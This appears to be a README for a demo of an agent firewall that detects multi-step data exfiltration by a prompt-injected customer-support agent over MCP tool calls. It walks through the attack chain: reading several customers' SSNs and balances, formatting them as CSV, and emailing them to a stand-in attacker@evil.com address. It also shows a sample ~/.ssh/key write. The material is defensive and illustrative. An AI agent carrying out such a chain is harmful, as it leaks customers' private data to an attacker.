# Demo: Agent Firewall Catches Multi-Step Exfiltration

This demo shows why per-call policy enforcement is insufficient for agentic security, and how session-level behavioral enforcement catches attacks that individual tool call inspection misses.

## The Attack

A prompt-injected support agent attempts to exfiltrate customer data:

1. `read_customer("cust_001")` → Gets Alice's SSN, email, balance ✅ allowed
2. `read_customer("cust_002")` → Gets Bob's data ✅ allowed
3. `read_customer("cust_003")` → Gets Carol's data ✅ allowed
4. `format_response("csv")` → Formats for export ✅ allowed
5. `send_email("attacker@evil.com")` → Exfiltrates everything ✅ allowed

Every individual action passes per-call policy. The trajectory is data exfiltration.

## What the Firewall Does

```
Agent → mcpfw (HTTP proxy, port 8443) → MCP Server (port 9000)
              │
              ├─ Layer 3: Per-call policy (allows everything in this demo)
              └─ Layer 2: Envelope (detects trajectory drift, blocks at step 4)
```

The envelope declares that this agent should follow a `search → read → reply` workflow. When it sees `read × 3 → format`, it detects workflow drift and blocks.

## Run It

```bash
# Prerequisites: Python 3.10+, agent-envelope repo cloned alongside mcpfw
bash demo/run_demo.sh
```

## Expected Output

```
🟢 NORMAL WORKFLOW: Answer customer password reset question
  Step 1: search_kb → ✅ KB result: Password reset requires email verification.
  Step 2: read_customer → ✅ {"name": "Alice Johnson"...}
  Step 3: send_reply → ✅ Reply sent to customer
  ✅ Workflow completed normally.

🔴 ATTACK WORKFLOW: Prompt injection → data exfiltration
  Step 1: read_customer → ✅ (allowed individually)
  Step 2: read_customer → ✅ (allowed individually)
  Step 3: read_customer → ✅ (allowed individually)
  Step 4: format_response → 🛑 BLOCKED by envelope: Trajectory doesn't match any declared workflow
  🛡️  Exfiltration PREVENTED at step 4.

🔓 Same attack WITHOUT firewall:
  Steps 1-5: all ✅
  ⚠️  ALL STEPS PASSED — data was exfiltrated!
```

## Files

| File | Purpose |
|------|---------|
| `run_demo.sh` | One-command demo runner (starts server, proxy, runs both scenarios) |
| `mock_server.py` | Simulated MCP server with customer DB, email, and KB tools |
| `agent.py` | Agent simulator that makes tool calls via HTTP |
| `envelope.yaml` | Behavioral envelope (allowed workflows, forbidden data flows) |
| `policy.yaml` | Permissive per-call policy (allows everything, proves Layer 3 alone is insufficient) |

## The Point

Per-call enforcement (Layer 3) catches known-bad actions: `write_file ~/.ssh/key`.

Session-level enforcement (Layer 2) catches unknown-bad trajectories: sequences of allowed actions that together constitute an attack.

You need both. This demo proves it.
